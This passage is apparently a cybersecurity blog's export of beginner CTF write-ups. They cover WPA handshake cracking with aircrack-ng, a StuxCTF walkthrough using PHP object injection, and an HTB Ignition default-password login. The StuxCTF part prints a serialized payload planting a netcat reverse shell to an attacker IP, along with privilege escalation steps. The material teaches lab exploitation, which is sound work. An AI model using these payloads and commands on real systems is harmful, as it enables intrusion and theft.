
[{"content":" Introduction # We all use Wi-Fi on a day-to-day basis. There is a lot that happens under the hood of this technology that we are all fond of and rely on every day. This room goes through some of the basics of this technology before we start learning about how to attack such network setups. Let’s dig in. If you wish to follow through, check out the room on TryHackMe called WIFIHacking101\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nAn Intro to WPA # In this section, we go through some of the basics of WIFI technology by going through some terminologies. Some of the discussed terminologies are:\nWi-Fi Protected Access (WPA) is a security standard for computing devices with wireless internet connections. Very susceptible to brute force attacks. WPA2-PSK: Wifi networks that you connect to by providing a password that\u0026rsquo;s the same for everyone. Take note that PSK stands for Pre-Shared-Key and is essentially what we commonly refer to as the WIFI password. Its also important to note that it has a minimum number of characters requirement as shown below: WPA2-EAP: Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server. RADIUS: A server for authenticating clients, not just for wifi. SSID: The network \u0026ldquo;name\u0026rdquo; that you see when you try and connect. ESSID: An SSID that may apply to multiple access points, eg a company office, normally forming a bigger network. For Aircrack they normally refer to the network you\u0026rsquo;re attacking. BSSID: An access point MAC (hardware) address Capturing Packets to attack # The most common tools used in WIFI hacking are found in the aircrack-ng suite which comes which consists of tools such as:\nAircrack-ng Airodump-ng Airmon-ng which mostly attack WPA(2) networks. You also need to ensure you have a monitor mode Network Interface Card (NIC) to capture the 4-way handshake used by WPA networks. If you need results fast, it is good to use injection mode, which de-authenticates a client from the WIFI and forces the handshake to re-occur as the client tries to reconnect to the network.\nMost of the commands used for tools within this suite can be found on this page. We are going to go through some of the basic ones below. But first, here is an overview and summary of things we can do to exploit WPA/WPA2 networks in a flowchart: The image above is courtesy of StationX. Note that we are not going to go through everything in this chart but just the basics. To enable monitor mode on our NIC we use the command:\nairmon-ng start wlan0 Which will give you an output like so: We can see that the interface name changes to wlan0mon. Oftentimes, there might be other processes currently using the network adapter we want to use or intend to use, therefore it’s a common practice to run this command first:\nairmon-ng check kill Which will kill all interfering processes and give you a similar output to this one: Now that our machine\u0026rsquo;s Network Interface Card(NIC) is in monitor mode, we need to capture some packets that we can use for our attack. But what tool in the suite do we use, let\u0026rsquo;s do a quick search on google: As shown above, we have a tool from the aircrack-ng suite for this exact task, the tool is called: airodump-ng Let’s have a look at its usage by viewing its help menu. We do that by running the command:\nsudo airodump-ng --help Notice the -w option or flag that writes the captured packets to a file. Scrolling down further, we notice other useful flags that we can use: The –bssid flag is used to set the BSSID to monitor and the –channel flag that sets the channel. There are many options that can be of use while working with this tool. All are listed on the help menu, which we can access using\nsudo airodump-ng –-help Let’s dive into a more practical part of it which is also the last bit. We can now assume that we managed to capture some traffic for a network that we intended to attack. In our case, we have the capturing part done for us, since we maybe don\u0026rsquo;t have a NIC that can go to monitor mode or don\u0026rsquo;t have a wireless adapter to do the capturing or injection. We are going to use a packet capture file that is provided to us, so let\u0026rsquo;s first extract it: Notice the NinjaJ-01.cap file, which is what we are going to use next to create a file that will help us crack the password. To do that, we use the command:\naircrack-ng -j wifi NinjaJc01.cap aircrack-ng: Tool from suite that we are using for this task The flag -j: flag that specifies generation of a file from the pcap file specified into one that can be used to crack the password by aircrack-ng or hashcat. wifi: name of new file to be generated if the command successfully runs. NinjaJc01.cap: The file we are generating our new file from. In the output below, notice that we now have the MAC address and Name of the WIFI network that we are trying to gain access by cracking the WIFI’s password. The command successfully executes, meaning we can move forward and attempt cracking the password. As shown below, we can see that a new file names wifi.hccapx has been generated for us to use in our next step. We can now run the command:\naircrack-ng -a2 -b 02:1A:11:FF:D9:BD -w /usr/share/wordlists/rockyou.txt wifi.hccapx Let’s break down the command to bits:\naircrack-ng: Main command for Aircrack-ng tool usage from the main suite. The flag -a2: This option specifies the attack mode. In this case, -a2 indicates a dictionary attack. A dictionary attack involves trying each word from a provided wordlist (dictionary) to crack the passphrase. The flag -b 02:1A:11:FF:D9:BD: This option specifies the BSSID (MAC address of the access point) of the target network. The -b option is followed by the BSSID of the target network to focus the attack on a specific network. The flag -w /usr/share/wordlists/rockyou.txt: This option specifies the wordlist (dictionary) to use for the dictionary attack. wifi.hccapx: This is the name of the capture file containing the handshake packets captured from the target Wi-Fi network. Aircrack-ng uses this file as input for the cracking process. After letting this run for a while, we are now able to get the password for this WIFI as shown in the output below: With that, we are done covering the basics of WIFI hacking. It is important to know that password cracking is a resource-intensive process and therefore works faster on GPUs as opposed to CPU usage. CONCLUSION # We covered the basics of WIFI hacking by starting us off with basic terminologies that we were to hear mentions of in the walkthrough, which was a lot of interesting theory. Then gradually moved to the practical bit of the work. It was fun to interact with some of the tools within the airmon-ng suite for WIFI or wireless attacks and I hope we all learned a thing or two along the way.\n","date":"19 March 2024","externalUrl":null,"permalink":"/posts/2024-03-19-wifi-hacking-101/2024-03-19-wifi-hacking-101/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eWe all use Wi-Fi on a day-to-day basis. There is a lot that happens under the hood of this technology that we are all fond of and rely on every day. This room goes through some of the basics of this technology before we start learning about how to attack such network setups. Let’s dig in. If you wish to follow through, check out the room on TryHackMe called \u003ca\n  href=\"https://tryhackme.com/room/wifihacking101\"\n    target=\"_blank\"\n  \u003eWIFIHacking101\u003c/a\u003e\u003c/p\u003e","title":"WIFI Hacking 101","type":"posts"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/categories/b2r/","section":"Categories","summary":"","title":"B2R","type":"categories"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/tags/b2r/","section":"Tags","summary":"","title":"B2R","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/categories/boot2root/","section":"Categories","summary":"","title":"Boot2root","type":"categories"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/tags/boot2root/","section":"Tags","summary":"","title":"Boot2root","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/categories/nmap/","section":"Categories","summary":"","title":"NMAP","type":"categories"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/tags/nmap/","section":"Tags","summary":"","title":"NMAP","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/categories/php-object-injection-attacks/","section":"Categories","summary":"","title":"PHP Object Injection Attacks","type":"categories"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/tags/php-object-injection-attacks/","section":"Tags","summary":"","title":"PHP Object Injection Attacks","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":" StuxCTF - Complete Beginner\u0026rsquo;s Writeup # Introduction # Welcome to this step-by-step walkthrough of the StuxCTF challenge! This writeup is designed for beginners who want to understand each technique used. We\u0026rsquo;ll cover:\nNetwork reconnaissance with Nmap Web enumeration and directory discovery Diffie-Hellman cryptography Local File Inclusion (LFI) vulnerabilities PHP Object Injection attacks Privilege escalation Let\u0026rsquo;s dive in!\nInitial Reconnaissance # Step 1: Port Scanning with Nmap # First, we need to discover what services are running on our target machine. We use Nmap (Network Mapper) for this:\nsudo nmap -sCV -T4 10.10.158.14 What this command does:\n-sC: Run default scripts for additional information -V: Version detection to identify service versions -T4: Timing template (faster scanning) Results:\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Key findings:\nPort 22: SSH service (for remote login) Port 80: Web server running Apache The scan also revealed a robots.txt file with a disallowed entry: /StuxCTF/ Web Application Analysis # Step 2: Examining robots.txt # The robots.txt file often contains interesting information that developers don\u0026rsquo;t want search engines to index:\ncurl http://10.10.158.14/robots.txt Output:\n# robots.txt generated by StuxCTF # Diffie-Hellman User-agent: * Disallow: Disallow: /StuxCTF/ Important observations:\nThere\u0026rsquo;s a hidden directory /StuxCTF/ A comment mentions \u0026ldquo;Diffie-Hellman\u0026rdquo; (a cryptographic algorithm) Step 3: Investigating the Main Website # Let\u0026rsquo;s look at the source code of the main page:\ncurl http://10.10.158.14/ In the HTML source, we find this hidden comment:\n\u0026lt;!-- The secret directory is... p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251; g: 7; a: 330; b: 450; g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617; --\u0026gt; This looks like Diffie-Hellman key exchange parameters!\nCryptography Challenge # Step 4: Understanding Diffie-Hellman Key Exchange # What is Diffie-Hellman? It\u0026rsquo;s a method for two parties to establish a shared secret over an insecure channel. The basic concept involves:\np: A large prime number g: A generator (base) a and b: Private keys g^c: A public key The goal: Calculate the shared secret that represents our hidden directory.\nStep 5: Solving the Cryptographic Puzzle # I created a Python script to calculate the shared secret:\n#!/usr/bin/python3 # Given values from the HTML comment p = 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251 g = 7 a = 330 b = 450 gc = 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617 # Calculate the shared secret gca = (gc**a) % p gcab = (gca**b) % p # The first 128 characters give us our directory name print(str(gcab)[:128]) Result:\n47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055 This long number is our secret directory!\nWeb Exploitation # Step 6: Accessing the Hidden Directory # Now we can access the hidden directory using our calculated path:\ncurl http://10.10.158.14/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/ Key findings in the response:\nA hint in the HTML: \u0026lt;!-- hint: /?file= --\u0026gt; This suggests a Local File Inclusion (LFI) vulnerability Step 7: Discovering the LFI Vulnerability # What is LFI? Local File Inclusion allows an attacker to include files from the server\u0026rsquo;s filesystem, potentially exposing sensitive information or enabling code execution.\nWhen we try to include index.php:\ncurl \u0026#34;http://10.10.158.14/[SECRET_DIRECTORY]/?file=index.php\u0026#34; We get a long hexadecimal string. After decoding this through multiple steps (hex decode → reverse → base64 decode), we discover the PHP source code!\nStep 8: Analyzing the Vulnerable PHP Code # The decoded PHP reveals:\n\u0026lt;?php error_reporting(0); class file { public $file = \u0026#34;dump.txt\u0026#34;; public $data = \u0026#34;dump test\u0026#34;; function __destruct(){ file_put_contents($this-\u0026gt;file, $this-\u0026gt;data); } } $file_name = $_GET[\u0026#39;file\u0026#39;]; if(isset($file_name) \u0026amp;\u0026amp; !file_exists($file_name)){ echo \u0026#34;File no Exist!\u0026#34;; } if($file_name==\u0026#34;index.php\u0026#34;){ $content = file_get_contents($file_name); $tags = array(\u0026#34;\u0026lt;?php\u0026#34;, \u0026#34;?\u0026gt;\u0026#34;); echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, \u0026#34;\u0026#34;, $content))))); } unserialize(file_get_contents($file_name)); ?\u0026gt; Critical vulnerability identified:\nThe code calls unserialize() on user-controlled input There\u0026rsquo;s a file class with a destructor that writes data to a file This is a perfect setup for PHP Object Injection! Exploitation # Step 9: Understanding PHP Object Injection # What is PHP Object Injection? When unserialize() processes malicious data, it can create objects that execute code when they\u0026rsquo;re destroyed (via __destruct() methods).\nOur attack plan:\nCreate a malicious serialized object Host it on our attack machine Make the vulnerable server download and unserialize it The destructor will write a PHP webshell to the server Step 10: Creating the Malicious Payload # Create exploit.php:\n\u0026lt;?php class file { public $file = \u0026#39;shell.php\u0026#39;; public $data = \u0026#39;\u0026lt;?php shell_exec(\u0026#34;nc -e /bin/bash 10.8.181.85 1234\u0026#34;); ?\u0026gt;\u0026#39;; } echo serialize(new file); ?\u0026gt; Generate the payload:\nphp exploit.php \u0026gt; payload.txt What this creates:\nA serialized object that, when unserialized, will create a shell.php file The file contains a reverse shell command using netcat Step 11: Hosting the Payload # Start a simple HTTP server to host our malicious payload:\npython3 -m http.server 8000 Step 12: Triggering the Vulnerability # Visit this URL to make the server download and execute our payload:\nhttp://10.10.158.14/[SECRET_DIRECTORY]/?file=http://10.8.181.85:8000/payload.txt What happens:\nServer downloads our payload.txt unserialize() creates our malicious file object When the script ends, __destruct() runs Our reverse shell code gets written to shell.php Step 13: Getting a Reverse Shell # Start a netcat listener on your machine:\nnc -lvnp 1234 Then trigger the shell by visiting:\nhttp://10.10.158.14/[SECRET_DIRECTORY]/shell.php Success! We now have a shell as the www-data user.\nPost-Exploitation # Step 14: Initial Access and User Flag # Once we have our shell, let\u0026rsquo;s explore:\n# Upgrade to a better shell python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; # Check current user whoami # Output: www-data # Look for users ls /home # Output: grecia # Get user flag cat /home/grecia/user.txt # Output: 0b6044b7807dd100b9e30f1bd09db53f Step 15: Privilege Escalation # Let\u0026rsquo;s check what sudo privileges our current user has:\nsudo -l Output:\nUser www-data may run the following commands on ubuntu: (ALL) NOPASSWD: ALL This is jackpot! The www-data user can run ANY command as root without a password.\nStep 16: Getting Root Access # # Switch to root sudo su # Get root flag cat /root/root.txt # Output: 0028454003b42601548df551b738976c Summary # We successfully compromised this machine through:\nReconnaissance: Used Nmap to discover open services Cryptography: Solved a Diffie-Hellman challenge to find a hidden directory Web Exploitation: Discovered and exploited an LFI vulnerability Object Injection: Used PHP Object Injection to achieve code execution Privilege Escalation: Leveraged overly permissive sudo configuration Key Learning Points # For Beginners: # Reconnaissance is crucial: Always start by mapping out the target\u0026rsquo;s attack surface.\nRead the source: Web applications often leak information in HTML comments and configuration files.\nUnderstand the code: Take time to analyze vulnerable code to understand exactly how exploits work.\nChain vulnerabilities: Multiple small vulnerabilities can often be combined for greater impact.\nSecurity Lessons: # Never trust user input: The unserialize() function should never process untrusted data.\nPrinciple of least privilege: The www-data user shouldn\u0026rsquo;t have unlimited sudo access.\nInput validation: All user-supplied data should be properly validated and sanitized.\nDefense in depth: Multiple security layers can prevent a single vulnerability from compromising the entire system.\nTools Used # Nmap: Network reconnaissance curl: Web requests and response analysis Python: Cryptographic calculations and payload hosting PHP: Creating malicious serialized objects Netcat: Reverse shell listener and connection CyberChef: Data decoding and analysis Conclusion # This CTF challenge demonstrates how attackers can chain together multiple techniques to achieve full system compromise. From solving cryptographic puzzles to exploiting web vulnerabilities and escalating privileges, each step builds upon the previous one.\nThe key takeaway for defenders is that security is only as strong as the weakest link. Even with cryptographic protections hiding the vulnerable directory, poor input validation and excessive privileges led to complete system compromise.\nFlags Captured:\nUser Flag: 0b6044b7807dd100b9e30f1bd09db53f Root Flag: 0028454003b42601548df551b738976c ","date":"31 August 2025","externalUrl":null,"permalink":"/posts/2025-08-31-stuxctf/2025-08-31-stuxctf/","section":"Posts","summary":"\u003ch1 class=\"relative group\"\u003eStuxCTF - Complete Beginner\u0026rsquo;s Writeup \n    \u003cdiv id=\"stuxctf---complete-beginners-writeup\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#stuxctf---complete-beginners-writeup\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\n\u003ch2 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eWelcome to this step-by-step walkthrough of the StuxCTF challenge! This writeup is designed for beginners who want to understand each technique used. We\u0026rsquo;ll cover:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eNetwork reconnaissance with Nmap\u003c/li\u003e\n\u003cli\u003eWeb enumeration and directory discovery\u003c/li\u003e\n\u003cli\u003eDiffie-Hellman cryptography\u003c/li\u003e\n\u003cli\u003eLocal File Inclusion (LFI) vulnerabilities\u003c/li\u003e\n\u003cli\u003ePHP Object Injection attacks\u003c/li\u003e\n\u003cli\u003ePrivilege escalation\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLet\u0026rsquo;s dive in!\u003c/p\u003e","title":"StuxCTF","type":"posts"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/categories/thm/","section":"Categories","summary":"","title":"THM","type":"categories"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/tags/thm/","section":"Tags","summary":"","title":"THM","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/categories/web/","section":"Categories","summary":"","title":"Web","type":"categories"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":" Welcome to My Cybersecurity Journey # Hey there, fellow security enthusiasts! I\u0026rsquo;m HushKat, and this is my digital playground where I share everything I learn in the fascinating world of cybersecurity. From CTF writeups to deep dives into digital forensics, this is where curiosity meets code-breaking.\nReady to see what this journey is all about? Check out one of my latest videos:\nWhether you\u0026rsquo;re a seasoned pro or just starting out like I once was, there\u0026rsquo;s something here for everyone. Dive into my latest posts, explore different categories, or learn more about me and this blog\u0026rsquo;s mission.\nHappy hacking! 🔐\n","date":"31 August 2025","externalUrl":null,"permalink":"/","section":"Welcome to HushKat's Cyber Den","summary":"\u003ch2 class=\"relative group\"\u003eWelcome to My Cybersecurity Journey \n    \u003cdiv id=\"welcome-to-my-cybersecurity-journey\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#welcome-to-my-cybersecurity-journey\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eHey there, fellow security enthusiasts! I\u0026rsquo;m \u003cstrong\u003eHushKat\u003c/strong\u003e, and this is my digital playground where I share everything I learn in the fascinating world of cybersecurity. From CTF writeups to deep dives into digital forensics, this is where curiosity meets code-breaking.\u003c/p\u003e\n\u003cp\u003eReady to see what this journey is all about? Check out one of my latest videos:\u003c/p\u003e","title":"Welcome to HushKat's Cyber Den","type":"page"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/categories/ffuf/","section":"Categories","summary":"","title":"FFUF","type":"categories"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/tags/ffuf/","section":"Tags","summary":"","title":"FFUF","type":"tags"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/categories/htb/","section":"Categories","summary":"","title":"HTB","type":"categories"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":" HTB Ignition - Beginner Penetration Testing Walkthrough # What is This? # This is a step-by-step guide for solving the \u0026ldquo;Ignition\u0026rdquo; challenge from Hack The Box (HTB). This walkthrough is designed for beginners who are new to penetration testing and cybersecurity.\nPrerequisites # Basic knowledge of Linux command line Understanding of what IP addresses and ports are Familiarity with web browsers Phase 1: Enumeration (Information Gathering) # What is Enumeration? # Enumeration is the process of gathering information about a target system. Think of it like reconnaissance - we\u0026rsquo;re trying to learn as much as possible about what services are running and how we might gain access.\nStep 1: Network Scanning with NMAP # What is NMAP? NMAP (Network Mapper) is a tool that scans networks to discover what services are running on different ports. Think of ports like doors on a building - each one might lead to a different service.\nThe Command:\nsudo nmap -sCV -p- -T4 10.129.1.27 Breaking Down the Command:\nsudo - Run with administrator privileges nmap - The network scanning tool -sCV - Combines two options: -sC - Run default scripts to gather more information -sV - Detect service versions -p- - Scan ALL ports (1-65535) instead of just common ones -T4 - Set timing to \u0026ldquo;aggressive\u0026rdquo; (faster scanning) 10.129.1.27 - The target IP address The Results:\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-30 09:58 EAT Nmap scan report for 10.129.1.27 Host is up (0.27s latency). Not shown: 65534 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Did not follow redirect to http://ignition.htb/ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 982.30 seconds Step 2: Understanding the Results # What We Found:\nOnly 1 open port: Port 80 (HTTP web service) Web server: nginx version 1.14.2 Important discovery: The website redirects to http://ignition.htb/ What is a Domain Name? ignition.htb is a domain name. However, our computer doesn\u0026rsquo;t know where this domain points to, so we need to tell it.\nStep 3: Adding the Domain to Our Hosts File # What is the /etc/hosts file? This file tells your computer which IP address to use when you type in a domain name. It\u0026rsquo;s like a local phone book for your computer.\nThe Command:\necho \u0026#34;10.129.1.27 ignition.htb\u0026#34; | sudo tee -a /etc/hosts Breaking Down the Command:\necho \u0026quot;10.129.1.27 ignition.htb\u0026quot; - Create the text we want to add | - Pipe (send) that text to the next command sudo tee -a /etc/hosts - Append the text to the /etc/hosts file with admin privileges Result: Now when we visit http://ignition.htb in our browser, it will go to IP address 10.129.1.27.\nPhase 2: Web Enumeration # Step 4: Exploring the Website # When we visit http://ignition.htb, we find a basic website but nothing immediately useful for gaining access.\nStep 5: Directory Brute-forcing # What is Directory Brute-forcing? This is the process of trying many different URL paths to find hidden pages or directories on a website. It\u0026rsquo;s like trying different door handles to see which ones are unlocked.\nThe Tool: FFUF FFUF (Fuzz Faster U Fool) is a web fuzzing tool that tries many different URLs quickly.\nThe Command:\nffuf -u http://ignition.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -ac -ic Breaking Down the Command:\nffuf - The fuzzing tool -u http://ignition.htb/FUZZ - The URL pattern (FUZZ gets replaced with words from our wordlist) -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt - The wordlist file containing common directory names -ac - Auto-calibrate to filter out false positives -ic - Ignore comments in wordlist The Results:\nadminuODLwsSK [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 610ms] contact [Status: 200, Size: 28673, Words: 6592, Lines: 504, Duration: 1205ms] home [Status: 200, Size: 25802, Words: 5441, Lines: 426, Duration: 2321ms] media [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 232ms] 0 [Status: 200, Size: 25803, Words: 5441, Lines: 426, Duration: 2441ms] static [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 283ms] catalog [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 6498ms] Home [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 5820ms] admin [Status: 200, Size: 7095, Words: 1551, Lines: 149, Duration: 6566ms] cms [Status: 200, Size: 25817, Words: 5441, Lines: 426, Duration: 5820ms] Understanding HTTP Status Codes:\n200 - OK (page exists and loads successfully) 301 - Permanent redirect 302 - Temporary redirect Key Discovery: We found an /admin page!\nPhase 3: Exploitation # Step 6: Investigating the Admin Panel # When we visit http://ignition.htb/admin, we discover:\nA login page for Magento (an e-commerce platform) We need username and password credentials What is Magento? Magento is a popular e-commerce platform used to build online stores. Admin panels are where administrators manage the website.\nStep 7: Credential Guessing # The Strategy: Since we don\u0026rsquo;t have specific credentials, we can try common default passwords. Many systems are left with weak, default credentials.\nCommon Weak Passwords: Based on research into commonly used passwords, we can try combinations like:\nadmin:admin admin:password admin:123456 admin:qwerty123 Some of these are listed here: https://cybernews.com/best-password-managers/most-common-passwords/\nStep 8: Successful Login # The Breakthrough: After trying common password combinations, the credentials admin:qwerty123 successfully logged us into the Magento admin panel.\nWhy This Worked:\nMany administrators use weak, predictable passwords \u0026ldquo;qwerty123\u0026rdquo; combines the QWERTY keyboard pattern with simple numbers Default usernames like \u0026ldquo;admin\u0026rdquo; are commonly left unchanged Step 9: Finding the Flag # Once logged into the Magento admin panel, we can explore the dashboard and find the flag for this challenge.\nKey Learning Points # Security Lessons Learned # Default Credentials are Dangerous\nAlways change default usernames and passwords Use strong, unique passwords for admin accounts Information Disclosure\nThe NMAP scan revealed the web server version Directory enumeration exposed the admin panel Both pieces of information helped us focus our attack The Importance of Enumeration\nThorough reconnaissance often reveals the path to success Multiple tools (NMAP, FFUF) provide different types of information Tools We Used # NMAP - Network and port scanning FFUF - Web directory/file fuzzing Web Browser - Manual exploration and login attempts Ethical Considerations # Important Note: This type of testing should only be performed on:\nSystems you own Systems you have explicit permission to test Dedicated practice environments (like Hack The Box) Unauthorized access to computer systems is illegal in most jurisdictions.\nSummary # This challenge demonstrated a common real-world scenario where:\nPoor password practices (weak admin credentials) Information leakage (exposed admin panels) Insufficient access controls Combined to create a security vulnerability that allowed unauthorized access to the system.\nThe key takeaway is that security is only as strong as the weakest link - in this case, a predictable password on an exposed admin interface.\n","date":"30 August 2025","externalUrl":null,"permalink":"/posts/2025-08-30-ignition/2025-08-30-ignition/","section":"Posts","summary":"\u003ch1 class=\"relative group\"\u003eHTB Ignition - Beginner Penetration Testing Walkthrough \n    \u003cdiv id=\"htb-ignition---beginner-penetration-testing-walkthrough\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#htb-ignition---beginner-penetration-testing-walkthrough\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\n\u003ch2 class=\"relative group\"\u003eWhat is This? \n    \u003cdiv id=\"what-is-this\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#what-is-this\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eThis is a step-by-step guide for solving the \u0026ldquo;Ignition\u0026rdquo; challenge from Hack The Box (HTB). This walkthrough is designed for beginners who are new to penetration testing and cybersecurity.\u003c/p\u003e\n\n\u003ch2 class=\"relative group\"\u003ePrerequisites \n    \u003cdiv id=\"prerequisites\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#prerequisites\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eBasic knowledge of Linux command line\u003c/li\u003e\n\u003cli\u003eUnderstanding of what IP addresses and ports are\u003c/li\u003e\n\u003cli\u003eFamiliarity with web browsers\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 class=\"relative group\"\u003ePhase 1: Enumeration (Information Gathering) \n    \u003cdiv id=\"phase-1-enumeration-information-gathering\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#phase-1-enumeration-information-gathering\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\n\u003ch3 class=\"relative group\"\u003eWhat is Enumeration? \n    \u003cdiv id=\"what-is-enumeration\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#what-is-enumeration\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003eEnumeration is the process of gathering information about a target system. Think of it like reconnaissance - we\u0026rsquo;re trying to learn as much as possible about what services are running and how we might gain access.\u003c/p\u003e","title":"Ignition","type":"posts"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/categories/very-easy/","section":"Categories","summary":"","title":"Very Easy","type":"categories"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/tags/very-easy/","section":"Tags","summary":"","title":"Very Easy","type":"tags"},{"content":"","date":"28 August 2025","externalUrl":null,"permalink":"/categories/aws-s3/","section":"Categories","summary":"","title":"Aws S3","type":"categories"},{"content":"","date":"28 August 